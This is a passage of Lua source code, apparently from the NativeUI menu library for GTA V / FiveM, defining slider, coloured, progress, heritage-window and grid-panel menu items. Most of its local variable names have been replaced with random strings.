            self._Index = #self.Items
        else
            self._Index = tonumber(Dq4IGxmvxn3n)
        end
    else
        return self._Index
    end
end
function UIMenuSliderHeritageItem:ItemToIndex(cXJ1h65lMbom2Wps)
    for i = 1, #self.Items do
        if type(cXJ1h65lMbom2Wps) == type(self.Items[i]) and cXJ1h65lMbom2Wps == self.Items[i] then
            return i
        end
    end
end
function UIMenuSliderHeritageItem:IndexToItem(HatzA6Ie)
    if tonumber(HatzA6Ie) then
        if tonumber(HatzA6Ie) == 0 then
            HatzA6Ie = 1
        end
        if self.Items[tonumber(HatzA6Ie)] then
            return self.Items[tonumber(HatzA6Ie)]
        end
    end
end
function UIMenuSliderHeritageItem:SetLeftBadge()
    error("This item does not support badges")
end
function UIMenuSliderHeritageItem:SetRightBadge()
    error("This item does not support badges")
end
function UIMenuSliderHeritageItem:RightLabel()
    error("This item does not support a right label")
end
function UIMenuSliderHeritageItem:Draw()
    self.Base:Draw()
    if self:Enabled() then
        if self:Selected() then
            self.LeftArrow:Colour(0, 0, 0, 255)
            self.RightArrow:Colour(0, 0, 0, 255)
        else
            self.LeftArrow:Colour(255, 255, 255, 255)
            self.RightArrow:Colour(255, 255, 255, 255)
        end
    else
        self.LeftArrow:Colour(255, 255, 255, 255)
        self.RightArrow:Colour(255, 255, 255, 255)
    end
    local LVfHcl1_JLT1smV1Y = ((self.Background.Width - self.Slider.Width) / (#self.Items - 1)) * (self._Index - 1)
    self.Slider:Position(
        250 + self.Base._Offset.X + LVfHcl1_JLT1smV1Y + self.Base.ParentMenu.WidthOffset,
        self.Slider.Y
    )
    self.LeftArrow:Draw()
    self.RightArrow:Draw()
    self.Background:Draw()
    self.Slider:Draw()
    self.Divider:Draw()
    self.Divider:Colour(255, 255, 255, 255)
end
UIMenuColouredItem = setmetatable({}, UIMenuColouredItem)
UIMenuColouredItem.__index = UIMenuColouredItem
UIMenuColouredItem.__call = function()
    return "UIMenuItem", "UIMenuColouredItem"
end
function UIMenuColouredItem.New(MNRTMeKBLLCvS4, FsFXYkIvdtkv3sRVeUR, g_qkjGGaqwBmm, d7BVXlcbf)
    if type(Colour) ~= "table" then
        Colour = {R = 0, G = 0, B = 0, A = 255}
    end
    if type(d7BVXlcbf) ~= "table" then
        Colour = {R = 255, G = 255, B = 255, A = 255}
    end
    local c6TgRwgENyxfVH9 = {
        Base = UIMenuItem.New(MNRTMeKBLLCvS4 or "", FsFXYkIvdtkv3sRVeUR or ""),
        Rectangle = UIResRectangle.New(
            0,
            0,
            431,
            38,
            g_qkjGGaqwBmm.R,
            g_qkjGGaqwBmm.G,
            g_qkjGGaqwBmm.B,
            g_qkjGGaqwBmm.A
        ),
        MainColour = g_qkjGGaqwBmm,
        HighlightColour = d7BVXlcbf,
        ParentMenu = nil,
        Activated = function(DbPrCut5ffP8Yp, revRdeubFbiZ6pvkT)
        end
    }
    c6TgRwgENyxfVH9.Base.SelectedSprite:Colour(d7BVXlcbf.R, d7BVXlcbf.G, d7BVXlcbf.B, d7BVXlcbf.A)
    return setmetatable(c6TgRwgENyxfVH9, UIMenuColouredItem)
end
function UIMenuColouredItem:SetParentMenu(DSyWTyySbuWE1E)
    if DSyWTyySbuWE1E() == "UIMenu" then
        self.Base.ParentMenu = DSyWTyySbuWE1E
        self.ParentMenu = DSyWTyySbuWE1E
    else
        return self.Base.ParentMenu
    end
end
function UIMenuColouredItem:Position(ux)
    if tonumber(ux) then
        self.Base:Position(ux)
        self.Rectangle:Position(self.Base._Offset.X, ux + 144 + self.Base._Offset.Y)
    end
end
function UIMenuColouredItem:Selected(r2SeeDjG71P)
    if r2SeeDjG71P ~= nil then
        self.Base._Selected = tobool(r2SeeDjG71P)
    else
        return self.Base._Selected
    end
end
function UIMenuColouredItem:Hovered(GEQETD42)
    if GEQETD42 ~= nil then
        self.Base._Hovered = tobool(GEQETD42)
    else
        return self.Base._Hovered
    end
end
function UIMenuColouredItem:Enabled(l7ZdUUI6bVn7fo2B3)
    if l7ZdUUI6bVn7fo2B3 ~= nil then
        self.Base._Enabled = tobool(l7ZdUUI6bVn7fo2B3)
    else
        return self.Base._Enabled
    end
end
function UIMenuColouredItem:Description(oEGzbZ7lQdudWZN6b8)
    if tostring(oEGzbZ7lQdudWZN6b8) and oEGzbZ7lQdudWZN6b8 ~= nil then
        self.Base._Description = tostring(oEGzbZ7lQdudWZN6b8)
    else
        return self.Base._Description
    end
end
function UIMenuColouredItem:Offset(JewIdCGxhrzA8CIHer19q, IPS9xGuno1EBqB)
    if tonumber(JewIdCGxhrzA8CIHer19q) or tonumber(IPS9xGuno1EBqB) then
        if tonumber(JewIdCGxhrzA8CIHer19q) then
            self.Base._Offset.X = tonumber(JewIdCGxhrzA8CIHer19q)
        end
        if tonumber(IPS9xGuno1EBqB) then
            self.Base._Offset.Y = tonumber(IPS9xGuno1EBqB)
        end
    else
        return self.Base._Offset
    end
end
function UIMenuColouredItem:Text(QjlDARnj1J8)
    if tostring(QjlDARnj1J8) and QjlDARnj1J8 ~= nil then
        self.Base.Text:Text(tostring(QjlDARnj1J8))
    else
        return self.Base.Text:Text()
    end
end
function UIMenuColouredItem:SetTextSelectedColor(q4, wrO6FlkpRj4lER, q, S)
    if tonumber(q4) and tonumber(wrO6FlkpRj4lER) and tonumber(q) and tonumber(S) then
        self.Base._Text.Colour.Selected.R = q4
        self.Base._Text.Colour.Selected.G = wrO6FlkpRj4lER
        self.Base._Text.Colour.Selected.B = q
        self.Base._Text.Colour.Selected.A = S
    else
        return {
            R = self.Base._Text.Colour.Selected.R,
            G = self.Base._Text.Colour.Selected.G,
            B = self.Base._Text.Colour.Selected.B,
            A = self.Base._Text.Colour.Selected.A
        }
    end
end
function UIMenuColouredItem:SetTextHoveredColor(UTbIfAnX, WX, p1w, Rkk_2B3)
    if tonumber(UTbIfAnX) and tonumber(WX) and tonumber(p1w) and tonumber(Rkk_2B3) then
        self.Base._Text.Colour.Hovered.R = UTbIfAnX
        self.Base._Text.Colour.Hovered.G = WX
        self.Base._Text.Colour.Hovered.B = p1w
        self.Base._Text.Colour.Hovered.A = Rkk_2B3
    else
        return {
            R = self.Base._Text.Colour.Hovered.R,
            G = self.Base._Text.Colour.Hovered.G,
            B = self.Base._Text.Colour.Hovered.B,
            A = self.Base._Text.Colour.Hovered.A
        }
    end
end
function UIMenuColouredItem:RightLabel(G, opshYl_URWvbU7, sxatO3Oe)
    if tostring(G) and G ~= nil then
        if type(opshYl_URWvbU7) == "table" then
            self.Base.Label.MainColour = opshYl_URWvbU7
        end
        if type(sxatO3Oe) == "table" then
            self.Base.Label.HighlightColour = sxatO3Oe
        end
        self.Base.Label.Text:Text(tostring(G))
    else
        self.Label.MainColour = {R = 0, G = 0, B = 0, A = 0}
        self.Label.HighlightColour = {R = 0, G = 0, B = 0, A = 0}
        return self.Base.Label.Text:Text()
    end
end
function UIMenuColouredItem:SetLeftBadge(Ofv3adChFzPPDky)
    if tonumber(Ofv3adChFzPPDky) then
        self.Base.LeftBadge.Badge = tonumber(Ofv3adChFzPPDky)
    end
end
function UIMenuColouredItem:SetRightBadge(IYCIQiZh_nrFT)
    if tonumber(IYCIQiZh_nrFT) then
        self.Base.RightBadge.Badge = tonumber(IYCIQiZh_nrFT)
    end
end
function UIMenuColouredItem:Draw()
    self.Rectangle:Size(431 + self.ParentMenu.WidthOffset, self.Rectangle.Height)
    self.Rectangle:Draw()
    self.Base:Draw()
end
UIMenuProgressItem = setmetatable({}, UIMenuProgressItem)
UIMenuProgressItem.__index = UIMenuProgressItem
UIMenuProgressItem.__call = function()
    return "UIMenuItem", "UIMenuProgressItem"
end
function UIMenuProgressItem.New(z_u, r, w6BzgwVHZueU, mzCDLSS0WUHfrcyyZjaL, icnwM1mit5jiq)
    if type(r) ~= "table" then
        r = {}
    end
    if w6BzgwVHZueU == 0 then
        w6BzgwVHZueU = 1
    end
    local ADaCuxp9aRrOR8pe = {
        Base = UIMenuItem.New(z_u or "", mzCDLSS0WUHfrcyyZjaL or ""),
        Data = {Items = r, Counter = tobool(icnwM1mit5jiq), Max = 407.5, Index = tonumber(w6BzgwVHZueU) or 1},
        Audio = {Slider = "CONTINUOUS_SLIDER", Library = "HUD_FRONTEND_DEFAULT_SOUNDSET", Id = nil},
        Background = UIResRectangle.New(0, 0, 415, 20, 0, 0, 0, 255),
        Bar = UIResRectangle.New(0, 0, 407.5, 12.5),
        OnProgressChanged = function(DIp, VoetpQo2WI5FW4w, uAfaMQay1OKU)
        end,
        OnProgressSelected = function(y9SiAUrCIQ94hKwZC, zeMYuAnG, WcF88W6hr2XVB)
        end
    }
    ADaCuxp9aRrOR8pe.Base.Rectangle.Height = 60
    ADaCuxp9aRrOR8pe.Base.SelectedSprite.Height = 60
    if ADaCuxp9aRrOR8pe.Data.Counter then
        ADaCuxp9aRrOR8pe.Base:RightLabel(ADaCuxp9aRrOR8pe.Data.Index .. "/" .. #ADaCuxp9aRrOR8pe.Data.Items)
    else
        ADaCuxp9aRrOR8pe.Base:RightLabel(
            (type(ADaCuxp9aRrOR8pe.Data.Items[ADaCuxp9aRrOR8pe.Data.Index]) == "table") and
                tostring(ADaCuxp9aRrOR8pe.Data.Items[ADaCuxp9aRrOR8pe.Data.Index].Name) or
                tostring(ADaCuxp9aRrOR8pe.Data.Items[ADaCuxp9aRrOR8pe.Data.Index])
        )
    end
    ADaCuxp9aRrOR8pe.Bar.Width = ADaCuxp9aRrOR8pe.Data.Index / #ADaCuxp9aRrOR8pe.Data.Items * ADaCuxp9aRrOR8pe.Data.Max
    return setmetatable(ADaCuxp9aRrOR8pe, UIMenuProgressItem)
end
function UIMenuProgressItem:SetParentMenu(eP66jcV)
    if eP66jcV() == "UIMenu" then
        self.Base.ParentMenu = eP66jcV
    else
        return self.Base.ParentMenu
    end
end
function UIMenuProgressItem:Position(K)
    if tonumber(K) then
        self.Base:Position(K)
        self.Data.Max = 407.5 + self.Base.ParentMenu.WidthOffset
        self.Background:Size(415 + self.Base.ParentMenu.WidthOffset, 20)
        self.Background:Position(8 + self.Base._Offset.X, 177 + K + self.Base._Offset.Y)
        self.Bar:Position(11.75 + self.Base._Offset.X, 180.75 + K + self.Base._Offset.Y)
    end
end
function UIMenuProgressItem:Selected(s5lqz4vvY81C5)
    if s5lqz4vvY81C5 ~= nil then
        self.Base._Selected = tobool(s5lqz4vvY81C5)
    else
        return self.Base._Selected
    end
end
function UIMenuProgressItem:Hovered(bHVCGP6)
    if bHVCGP6 ~= nil then
        self.Base._Hovered = tobool(bHVCGP6)
    else
        return self.Base._Hovered
    end
end
function UIMenuProgressItem:Enabled(pqIPc2LnX3r)
    if pqIPc2LnX3r ~= nil then
        self.Base._Enabled = tobool(pqIPc2LnX3r)
    else
        return self.Base._Enabled
    end
end
function UIMenuProgressItem:Description(wOHWVcurLA0LPMCtqHYlz)
    if tostring(wOHWVcurLA0LPMCtqHYlz) and wOHWVcurLA0LPMCtqHYlz ~= nil then
        self.Base._Description = tostring(wOHWVcurLA0LPMCtqHYlz)
    else
        return self.Base._Description
    end
end
function UIMenuProgressItem:Offset(fkY50CZN_OsxslP4CP, PwuVBnXTqs8EUgau)
    if tonumber(fkY50CZN_OsxslP4CP) or tonumber(PwuVBnXTqs8EUgau) then
        if tonumber(fkY50CZN_OsxslP4CP) then
            self.Base._Offset.X = tonumber(fkY50CZN_OsxslP4CP)
        end
        if tonumber(PwuVBnXTqs8EUgau) then
            self.Base._Offset.Y = tonumber(PwuVBnXTqs8EUgau)
        end
    else
        return self.Base._Offset
    end
end
function UIMenuProgressItem:Text(CDw)
    if tostring(CDw) and CDw ~= nil then
        self.Base.Text:Text(tostring(CDw))
    else
        return self.Base.Text:Text()
    end
end
function UIMenuProgressItem:Index(R5jxnlHELWsmZs0V)
    if tonumber(R5jxnlHELWsmZs0V) then
        if tonumber(R5jxnlHELWsmZs0V) > #self.Data.Items then
            self.Data.Index = 1
        elseif tonumber(R5jxnlHELWsmZs0V) < 1 then
            self.Data.Index = #self.Data.Items
        else
            self.Data.Index = tonumber(R5jxnlHELWsmZs0V)
        end
        if self.Data.Counter then
            self.Base:RightLabel(self.Data.Index .. "/" .. #self.Data.Items)
        else
            self.Base:RightLabel(
                (type(self.Data.Items[self.Data.Index]) == "table") and tostring(self.Data.Items[self.Data.Index].Name) or
                    tostring(self.Data.Items[self.Data.Index])
            )
        end
        self.Bar.Width = self.Data.Index / #self.Data.Items * self.Data.Max
    else
        return self.Data.Index
    end
end
function UIMenuProgressItem:ItemToIndex(BsBDgSwTtKALKpoUFEYz)
    for i = 1, #self.Data.Items do
        if type(BsBDgSwTtKALKpoUFEYz) == type(self.Data.Items[i]) and BsBDgSwTtKALKpoUFEYz == self.Data.Items[i] then
            return i
        elseif
            type(self.Data.Items[i]) == "table" and
                (type(BsBDgSwTtKALKpoUFEYz) == type(self.Data.Items[i].Name) or
                    type(BsBDgSwTtKALKpoUFEYz) == type(self.Data.Items[i].Value)) and
                (BsBDgSwTtKALKpoUFEYz == self.Data.Items[i].Name or BsBDgSwTtKALKpoUFEYz == self.Data.Items[i].Value)
         then
            return i
        end
    end
end
function UIMenuProgressItem:IndexToItem(sMJiuriYwG96ZiLazBt7)
    if tonumber(sMJiuriYwG96ZiLazBt7) then
        if tonumber(sMJiuriYwG96ZiLazBt7) == 0 then
            sMJiuriYwG96ZiLazBt7 = 1
        end
        if self.Data.Items[tonumber(sMJiuriYwG96ZiLazBt7)] then
            return self.Data.Items[tonumber(sMJiuriYwG96ZiLazBt7)]
        end
    end
end
function UIMenuProgressItem:SetLeftBadge()
    error("This item does not support badges")
end
function UIMenuProgressItem:SetRightBadge()
    error("This item does not support badges")
end
function UIMenuProgressItem:RightLabel()
    error("This item does not support a right label")
end
function UIMenuProgressItem:CalculateProgress(xAVqmIw)
    local mBUF8G6MiwchMfUgV7 = xAVqmIw - self.Bar.X
    self:Index(
        math.round(
            #self.Data.Items *
                (((mBUF8G6MiwchMfUgV7 >= 0 and mBUF8G6MiwchMfUgV7 <= self.Data.Max) and mBUF8G6MiwchMfUgV7 or
                    ((mBUF8G6MiwchMfUgV7 < 0) and 0 or self.Data.Max)) /
                    self.Data.Max)
        )
    )
end
function UIMenuProgressItem:Draw()
    self.Base:Draw()
    if self.Base._Selected then
        self.Background:Colour(table.unpack(Colours.Black))
        self.Bar:Colour(table.unpack(Colours.White))
    else
        self.Background:Colour(table.unpack(Colours.White))
        self.Bar:Colour(table.unpack(Colours.Black))
    end
    self.Background:Draw()
    self.Bar:Draw()
end
UIMenuSliderProgressItem = setmetatable({}, UIMenuSliderProgressItem)
UIMenuSliderProgressItem.__index = UIMenuSliderProgressItem
UIMenuSliderProgressItem.__call = function()
    return "UIMenuItem", "UIMenuSliderProgressItem"
end
function UIMenuSliderProgressItem.New(V4_q8pR, Jr, rJSiLwlqdM3wTmyzgX, aYtcS6fxnx, bPMQ61dTUeW3zJ, SCQCFz17j6nEoM9XG1)
    if type(Jr) ~= "table" then
        Jr = {}
    end
    if rJSiLwlqdM3wTmyzgX == 0 then
        rJSiLwlqdM3wTmyzgX = 1
    end
    if type(bPMQ61dTUeW3zJ) ~= "table" or bPMQ61dTUeW3zJ == nil then
        _SliderColors = {R = 57, G = 119, B = 200, A = 255}
    else
        _SliderColors = bPMQ61dTUeW3zJ
    end
    if type(SCQCFz17j6nEoM9XG1) ~= "table" or SCQCFz17j6nEoM9XG1 == nil then
        _BackgroundSliderColors = {R = 4, G = 32, B = 57, A = 255}
    else
        _BackgroundSliderColors = SCQCFz17j6nEoM9XG1
    end
    local fvcfutsA1k0HVN0e = {
        Base = UIMenuItem.New(V4_q8pR or "", aYtcS6fxnx or ""),
        Items = Jr,
        LeftArrow = Sprite.New("commonmenu", "arrowleft", 0, 105, 25, 25),
        RightArrow = Sprite.New("commonmenu", "arrowright", 0, 105, 25, 25),
        Background = UIResRectangle.New(
            0,
            0,
            150,
            10,
            _BackgroundSliderColors.R,
            _BackgroundSliderColors.G,
            _BackgroundSliderColors.B,
            _BackgroundSliderColors.A
        ),
        Slider = UIResRectangle.New(0, 0, 75, 10, _SliderColors.R, _SliderColors.G, _SliderColors.B, _SliderColors.A),
        Divider = UIResRectangle.New(0, 0, 4, 20, 255, 255, 255, 255),
        _Index = tonumber(rJSiLwlqdM3wTmyzgX) or 1,
        OnSliderChanged = function(Iu7yT6A6cutxrqsU, zY6lr, ep8Oq5xxqog)
        end,
        OnSliderSelected = function(wK, _Wjm1fwruloMe0, mgsxp0nERWIHQkbQChtzL)
        end
    }
    local eicZRaE_l5zc =
        ((fvcfutsA1k0HVN0e.Background.Width) / (#fvcfutsA1k0HVN0e.Items - 1)) * (fvcfutsA1k0HVN0e._Index - 1)
    fvcfutsA1k0HVN0e.Slider.Width = eicZRaE_l5zc
    return setmetatable(fvcfutsA1k0HVN0e, UIMenuSliderProgressItem)
end
function UIMenuSliderProgressItem:SetParentMenu(vg8TY5wph2E81xCXnHt)
    if vg8TY5wph2E81xCXnHt() == "UIMenu" then
        self.Base.ParentMenu = vg8TY5wph2E81xCXnHt
    else
        return self.Base.ParentMenu
    end
end
function UIMenuSliderProgressItem:Position(zIz47Td6MZ)
    if tonumber(zIz47Td6MZ) then
        self.Background:Position(
            250 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            zIz47Td6MZ + 158.5 + self.Base._Offset.Y
        )
        self.Slider:Position(
            250 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            zIz47Td6MZ + 158.5 + self.Base._Offset.Y
        )
        self.Divider:Position(
            323.5 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            zIz47Td6MZ + 153 + self.Base._Offset.Y
        )
        self.LeftArrow:Position(
            225 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            150.5 + zIz47Td6MZ + self.Base._Offset.Y
        )
        self.RightArrow:Position(
            400 + self.Base._Offset.X + self.Base.ParentMenu.WidthOffset,
            150.5 + zIz47Td6MZ + self.Base._Offset.Y
        )
        self.Base:Position(zIz47Td6MZ)
    end
end
function UIMenuSliderProgressItem:Selected(zSQeUj4j)
    if zSQeUj4j ~= nil then
        self.Base._Selected = tobool(zSQeUj4j)
    else
        return self.Base._Selected
    end
end
function UIMenuSliderProgressItem:Hovered(UqA)
    if UqA ~= nil then
        self.Base._Hovered = tobool(UqA)
    else
        return self.Base._Hovered
    end
end
function UIMenuSliderProgressItem:Enabled(vryz2V_TG1E8U)
    if vryz2V_TG1E8U ~= nil then
        self.Base._Enabled = tobool(vryz2V_TG1E8U)
    else
        return self.Base._Enabled
    end
end
function UIMenuSliderProgressItem:Description(EeC6Q5yAZ)
    if tostring(EeC6Q5yAZ) and EeC6Q5yAZ ~= nil then
        self.Base._Description = tostring(EeC6Q5yAZ)
    else
        return self.Base._Description
    end
end
function UIMenuSliderProgressItem:Offset(zJ6M8p_BhUnDJm, ngJanjDR)
    if tonumber(zJ6M8p_BhUnDJm) or tonumber(ngJanjDR) then
        if tonumber(zJ6M8p_BhUnDJm) then
            self.Base._Offset.X = tonumber(zJ6M8p_BhUnDJm)
        end
        if tonumber(ngJanjDR) then
            self.Base._Offset.Y = tonumber(ngJanjDR)
        end
    else
        return self.Base._Offset
    end
end
function UIMenuSliderProgressItem:Text(mCz)
    if tostring(mCz) and mCz ~= nil then
        self.Base.Text:Text(tostring(mCz))
    else
        return self.Base.Text:Text()
    end
end
function UIMenuSliderProgressItem:Index(sM2y947TC4)
    if tonumber(sM2y947TC4) then
        if tonumber(sM2y947TC4) > #self.Items then
            self._Index = #self.Items
        elseif tonumber(sM2y947TC4) < 1 then
            self._Index = 1
        else
            self._Index = tonumber(sM2y947TC4)
        end
    else
        local w4 = ((self.Background.Width) / (#self.Items - 1)) * (self._Index - 1)
        self.Slider.Width = w4
        return self._Index
    end
end
function UIMenuSliderProgressItem:ItemToIndex(mOEbxZYCQvpe)
    for i = 1, #self.Items do
        if type(mOEbxZYCQvpe) == type(self.Items[i]) and mOEbxZYCQvpe == self.Items[i] then
            return i
        end
    end
end
function UIMenuSliderProgressItem:IndexToItem(Y4eks)
    if tonumber(Y4eks) then
        if tonumber(Y4eks) == 0 then
            Y4eks = 1
        end
        if self.Items[tonumber(Y4eks)] then
            return self.Items[tonumber(Y4eks)]
        end
    end
end
function UIMenuSliderProgressItem:SetLeftBadge()
    error("This item does not support badges")
end
function UIMenuSliderProgressItem:SetRightBadge()
    error("This item does not support badges")
end
function UIMenuSliderProgressItem:RightLabel()
    error("This item does not support a right label")
end
function UIMenuSliderProgressItem:Draw()
    self.Base:Draw()
    if self:Enabled() then
        if self:Selected() then
            self.LeftArrow:Colour(0, 0, 0, 255)
            self.RightArrow:Colour(0, 0, 0, 255)
        else
            self.LeftArrow:Colour(245, 245, 245, 255)
            self.RightArrow:Colour(245, 245, 245, 255)
        end
    else
        self.LeftArrow:Colour(163, 159, 148, 255)
        self.RightArrow:Colour(163, 159, 148, 255)
    end
    if self:Selected() then
        self.LeftArrow:Draw()
        self.RightArrow:Draw()
    end
    self.Background:Draw()
    self.Slider:Draw()
end
UIMenuHeritageWindow = setmetatable({}, UIMenuHeritageWindow)
UIMenuHeritageWindow.__index = UIMenuHeritageWindow
UIMenuHeritageWindow.__call = function()
    return "UIMenuWindow", "UIMenuHeritageWindow"
end
function UIMenuHeritageWindow.New(NiYf4dFKgczditV, W)
    if not tonumber(NiYf4dFKgczditV) then
        NiYf4dFKgczditV = 0
    end
    if not (NiYf4dFKgczditV >= 0 and NiYf4dFKgczditV <= 21) then
        NiYf4dFKgczditV = 0
    end
    if not tonumber(W) then
        W = 0
    end
    if not (W >= 0 and W <= 23) then
        W = 0
    end
    local TKGvg1VUmQ = {
        Background = Sprite.New("pause_menu_pages_char_mom_dad", "mumdadbg", 0, 0, 431, 228),
        MumSprite = Sprite.New(
            "char_creator_portraits",
            ((NiYf4dFKgczditV < 21) and "female_" .. NiYf4dFKgczditV or
                "special_female_" .. (tonumber(string.sub(NiYf4dFKgczditV, 2, 2)) - 1)),
            0,
            0,
            228,
            228
        ),
        DadSprite = Sprite.New(
            "char_creator_portraits",
            ((W < 21) and "male_" .. W or "special_male_" .. (tonumber(string.sub(W, 2, 2)) - 1)),
            0,
            0,
            228,
            228
        ),
        Mum = NiYf4dFKgczditV,
        Dad = W,
        _Offset = {X = 0, Y = 0},
        ParentMenu = nil
    }
    return setmetatable(TKGvg1VUmQ, UIMenuHeritageWindow)
end
function UIMenuHeritageWindow:SetParentMenu(JucfzkEexXoaU_y)
    if JucfzkEexXoaU_y() == "UIMenu" then
        self.ParentMenu = JucfzkEexXoaU_y
    else
        return self.ParentMenu
    end
end
function UIMenuHeritageWindow:Offset(VT76GSHCgAOgJSOlaXi, vx8GLahA5SeW5mdJ7Ym)
    if tonumber(VT76GSHCgAOgJSOlaXi) or tonumber(vx8GLahA5SeW5mdJ7Ym) then
        if tonumber(VT76GSHCgAOgJSOlaXi) then
            self._Offset.X = tonumber(VT76GSHCgAOgJSOlaXi)
        end
        if tonumber(vx8GLahA5SeW5mdJ7Ym) then
            self._Offset.Y = tonumber(vx8GLahA5SeW5mdJ7Ym)
        end
    else
        return self._Offset
    end
end
function UIMenuHeritageWindow:Position(u7sZQVKe)
    if tonumber(u7sZQVKe) then
        self.Background:Position(self._Offset.X, 144 + u7sZQVKe + self._Offset.Y)
        self.MumSprite:Position(
            self._Offset.X + (self.ParentMenu.WidthOffset / 2) + 25,
            144 + u7sZQVKe + self._Offset.Y
        )
        self.DadSprite:Position(
            self._Offset.X + (self.ParentMenu.WidthOffset / 2) + 195,
            144 + u7sZQVKe + self._Offset.Y
        )
    end
end
function UIMenuHeritageWindow:Index(UHlvf8mqIhoC1o33A7Y_u, tveovNvL98DVJ40Udq4l5)
    if not tonumber(UHlvf8mqIhoC1o33A7Y_u) then
        UHlvf8mqIhoC1o33A7Y_u = self.Mum
    end
    if not (UHlvf8mqIhoC1o33A7Y_u >= 0 and UHlvf8mqIhoC1o33A7Y_u <= 21) then
        UHlvf8mqIhoC1o33A7Y_u = self.Mum
    end
    if not tonumber(tveovNvL98DVJ40Udq4l5) then
        tveovNvL98DVJ40Udq4l5 = self.Dad
    end
    if not (tveovNvL98DVJ40Udq4l5 >= 0 and tveovNvL98DVJ40Udq4l5 <= 23) then
        tveovNvL98DVJ40Udq4l5 = self.Dad
    end
    self.Mum = UHlvf8mqIhoC1o33A7Y_u
    self.Dad = tveovNvL98DVJ40Udq4l5
    self.MumSprite.TxtName =
        ((self.Mum < 21) and "female_" .. self.Mum or
        "special_female_" .. (tonumber(string.sub(UHlvf8mqIhoC1o33A7Y_u, 2, 2)) - 1))
    self.DadSprite.TxtName =
        ((self.Dad < 21) and "male_" .. self.Dad or
        "special_male_" .. (tonumber(string.sub(tveovNvL98DVJ40Udq4l5, 2, 2)) - 1))
end
function UIMenuHeritageWindow:Draw()
    self.Background:Size(431 + self.ParentMenu.WidthOffset, 228)
    self.Background:Draw()
    self.DadSprite:Draw()
    self.MumSprite:Draw()
end
UIMenuGridPanel = setmetatable({}, UIMenuGridPanel)
UIMenuGridPanel.__index = UIMenuGridPanel
UIMenuGridPanel.__call = function()
    return "UIMenuPanel", "UIMenuGridPanel"
end
function UIMenuGridPanel.New(
    CmowmPwRZKwXd4fh8_,
    KNOt3FKyM897Z1itMuN,
    Xl2Mnwks4zcK4f,
    VGTrp4QWVPmUaEvCQi,
    k6eZPjHOR,
    T4m8Cl_jntp)
    print(k6eZPjHOR)
    local v9Uz01NrjBUi4daAhl2u = {
        Data = {Enabled = true},
        Background = Sprite.New("commonmenu", "gradient_bgd", 0, 0, 431, 275),
        Grid = Sprite.New("pause_menu_pages_char_mom_dad", "nose_grid", 0, 0, 200, 200, 0, 255, 255, 255, 255),
        Circle = Sprite.New("mpinventory", "in_world_circle", 0, 0, 20, 20, 0),
        Audio = {Slider = "CONTINUOUS_SLIDER", Library = "HUD_FRONTEND_DEFAULT_SOUNDSET", Id = nil},
        ParentItem = nil,
        Text = {
            Top = UIResText.New(CmowmPwRZKwXd4fh8_ or "Top", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre"),
            Left = UIResText.New(KNOt3FKyM897Z1itMuN or "Left", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre"),
            Right = UIResText.New(Xl2Mnwks4zcK4f or "Right", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre"),
            Bottom = UIResText.New(VGTrp4QWVPmUaEvCQi or "Bottom", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre")
        },
        SetCirclePosition = {X = k6eZPjHOR or 0.5, Y = T4m8Cl_jntp or 0.5}
    }
    return setmetatable(v9Uz01NrjBUi4daAhl2u, UIMenuGridPanel)
end
function UIMenuGridPanel:SetParentItem(qttuRs9rdRVpnHjZ2)
    if qttuRs9rdRVpnHjZ2() == "UIMenuItem" then
        self.ParentItem = qttuRs9rdRVpnHjZ2
    else
        return self.ParentItem
    end
end
function UIMenuGridPanel:Enabled(tguNLAgUP4su7DnLT0U)
    if type(tguNLAgUP4su7DnLT0U) == "boolean" then
        self.Data.Enabled = tguNLAgUP4su7DnLT0U
    else
        return self.Data.Enabled
    end
end
function UIMenuGridPanel:CirclePosition(qgkfi3Iw8tg, tKBmmaPnM2q)
    if tonumber(qgkfi3Iw8tg) and tonumber(tKBmmaPnM2q) then
        self.Circle.X =
            (self.Grid.X + 20) +
            ((self.Grid.Width - 40) * ((qgkfi3Iw8tg >= 0.0 and qgkfi3Iw8tg <= 1.0) and qgkfi3Iw8tg or 0.0)) -
            (self.Circle.Width / 2)
        self.Circle.Y =
            (self.Grid.Y + 20) +
            ((self.Grid.Height - 40) * ((tKBmmaPnM2q >= 0.0 and tKBmmaPnM2q <= 1.0) and tKBmmaPnM2q or 0.0)) -
            (self.Circle.Height / 2)
    else
        return math.round((self.Circle.X - (self.Grid.X + 20) + (self.Circle.Width / 2)) / (self.Grid.Width - 40), 2), math.round(
            (self.Circle.Y - (self.Grid.Y + 20) + (self.Circle.Height / 2)) / (self.Grid.Height - 40),
            2
        )
    end
end
function UIMenuGridPanel:Position(BGDcw)
    if tonumber(BGDcw) then
        local c4yeTAHk9a5Vm, jIrYGB57cS7 = self.ParentItem:Offset().X, self.ParentItem:SetParentMenu().WidthOffset
        self.Background:Position(c4yeTAHk9a5Vm, BGDcw)
        self.Grid:Position(c4yeTAHk9a5Vm + 115.5 + (jIrYGB57cS7 / 2), 37.5 + BGDcw)
        self.Text.Top:Position(c4yeTAHk9a5Vm + 215.5 + (jIrYGB57cS7 / 2), 5 + BGDcw)
        self.Text.Left:Position(c4yeTAHk9a5Vm + 57.75 + (jIrYGB57cS7 / 2), 120 + BGDcw)
        self.Text.Right:Position(c4yeTAHk9a5Vm + 373.25 + (jIrYGB57cS7 / 2), 120 + BGDcw)
        self.Text.Bottom:Position(c4yeTAHk9a5Vm + 215.5 + (jIrYGB57cS7 / 2), 240 + BGDcw)
        if not self.CircleLocked then
            self.CircleLocked = true
            self:CirclePosition(self.SetCirclePosition.X, self.SetCirclePosition.Y)
        end
    end
end
function UIMenuGridPanel:UpdateParent(Ha8ECHdd5edTMCx, GG_)
    local WglE, AMXIev_XT = self.ParentItem()
    self.Data.Value = {X = Ha8ECHdd5edTMCx, Y = GG_}
    if AMXIev_XT == "UIMenuListItem" then
        local nu9nvSjme4dWexv1PvGmz = self.ParentItem:FindPanelItem()
        if nu9nvSjme4dWexv1PvGmz then
            self.ParentItem.Items[nu9nvSjme4dWexv1PvGmz].Value[self.ParentItem:FindPanelIndex(self)] = {
                X = Ha8ECHdd5edTMCx,
                Y = GG_
            }
            self.ParentItem:Index(nu9nvSjme4dWexv1PvGmz)
            self.ParentItem.Base.ParentMenu.OnListChange(
